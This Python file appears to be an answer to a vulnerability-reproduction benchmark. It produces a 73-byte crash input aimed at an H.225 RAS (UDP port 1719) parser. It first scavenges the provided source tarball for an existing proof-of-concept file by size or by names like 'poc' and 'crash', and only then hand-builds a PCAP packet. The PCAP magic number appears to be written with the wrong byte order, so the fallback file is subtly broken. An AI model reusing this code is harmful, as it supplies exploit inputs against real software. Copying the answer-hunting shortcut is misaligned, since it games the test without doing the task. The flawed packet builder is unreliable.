import struct
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find an embedded PoC in the tarball with size 73 bytes (ground-truth length)
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                # Prefer exact size 73
                for m in tf.getmembers():
                    if m.isfile() and m.size == 73:
                        try:
                            f = tf.extractfile(m)
                            if f:
                                data = f.read()
                                if len(data) == 73:
                                    return data
                        except Exception:
                            pass
                # Otherwise, try small files likely to be PoCs
                candidates = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 512:
                        name = m.name.lower()
                        if any(k in name for k in ('h225', 'ras', 'poc', 'crash', 'repro', 'pcap')):
                            candidates.append(m)
                for m in candidates:
                    try:
                        f = tf.extractfile(m)
                        if f:
                            data = f.read()
                            if data:
                                return data
                    except Exception:
                        continue
        except Exception:
            pass

        # Fallback: Construct a minimal PCAP with a single UDP packet to port 1719 (H.225 RAS)
        # Linktype: DLT_NULL (0), so packet data starts with 4-byte AF family (AF_INET=2)
        # Total file size: 24 (pcap hdr) + 16 (rec hdr) + 4 (DLT_NULL) + 20 (IPv4) + 8 (UDP) + 1 (payload) = 73 bytes

        def ip_to_int(a, b, c, d):
            return (a << 24) | (b << 16) | (c << 8) | d

        payload = b'\x00'  # 1-byte payload
        udp_src = 1719
        udp_dst = 1719

        # PCAP Global Header (little-endian)
        pcap_hdr = struct.pack(
            '<IHHIIII',
            0xD4C3B2A1,  # magic (little endian)
            2, 4,        # version major/minor
            0,           # thiszone
            0,           # sigfigs
            0xFFFF,      # snaplen
            0            # network: LINKTYPE_NULL (DLT_NULL)
        )

        # Packet data: DLT_NULL header + IPv4 + UDP + payload
        # DLT_NULL: AF_INET = 2
        null_hdr = struct.pack('<I', 2)

        total_len_ip_payload = 20 + 8 + len(payload)
        # IPv4 header (network byte order)
        vihl = (4 << 4) | 5
        tos = 0
        tot_len = total_len_ip_payload
        ident = 0
        flags_frag = 0
        ttl = 64
        proto = 17  # UDP
        ip_csum = 0
        src_ip = ip_to_int(1, 1, 1, 1)
        dst_ip = ip_to_int(2, 2, 2, 2)
        ip_hdr = struct.pack('!BBHHHBBHII',
                             vihl, tos, tot_len, ident, flags_frag, ttl, proto, ip_csum,
                             src_ip, dst_ip)

        # UDP header (network byte order)
        udp_len = 8 + len(payload)
        udp_csum = 0
        udp_hdr = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_csum)

        pkt_data = null_hdr + ip_hdr + udp_hdr + payload

        # PCAP Record Header (little-endian)
        incl_len = len(pkt_data)
        orig_len = incl_len
        rec_hdr = struct.pack('<IIII', 0, 0, incl_len, orig_len)

        return pcap_hdr + rec_hdr + pkt_data